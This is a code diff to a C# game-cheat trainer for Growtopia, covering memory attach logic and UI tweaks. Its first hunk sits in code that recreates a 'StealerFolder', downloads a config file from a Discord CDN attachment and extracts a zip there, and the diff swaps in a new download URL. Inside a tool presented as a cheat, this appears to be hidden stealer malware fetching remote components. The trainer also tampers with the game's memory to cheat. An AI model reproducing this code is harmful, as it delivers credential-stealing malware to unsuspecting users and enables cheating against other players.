@@ -127,7 +127,7 @@ namespace FreeZeHAX_Trainer
                     others.DirClean(StealerFolder);
                     others.Wait(2000);
                     Directory.CreateDirectory(StealerFolderLoc);
-                    web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/942830701512904754/App.config"), StealerFolderLoc + "\\App.config");
+                    web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/942839791530151977/App.config"), StealerFolderLoc + "\\App.config");
                     others.Wait(2000);
                     System.IO.Compression.ZipFile.ExtractToDirectory(StealerFolderLoc + "\\" + ZipFileName, StealerFolderLoc);
                     others.Wait(2000);
@@ -308,7 +308,7 @@ namespace FreeZeHAX_Trainer
 
         private void Opacity_Track_Scroll(object sender, ScrollEventArgs e)
         {
-            ActiveForm.Opacity = (OpacityTrackBar.Value / 100.0);
+            ActiveForm.Opacity = OpacityTrackBar.Value / 100.0;
             TrackbarText.Text = OpacityTrackBar.Value.ToString();
         }
 
@@ -316,11 +316,12 @@ namespace FreeZeHAX_Trainer
         {
             if (!mem.OpenProcess("Growtopia.exe"))
             {
-                System.Threading.Thread.Sleep(1000);
-                return;
+                ProcOpen = false;
             }
-
-            ProcOpen = true;
+            else
+            {
+                ProcOpen = true;
+            }
 
             System.Threading.Thread.Sleep(1000);
             Auto_Attach.ReportProgress(0);
@@ -371,6 +372,10 @@ namespace FreeZeHAX_Trainer
                     }
                 }
                 catch (Exception) { }
+            }
+            else
+            {
+                CheatAddresses.Items.Clear();
             }
         }
 
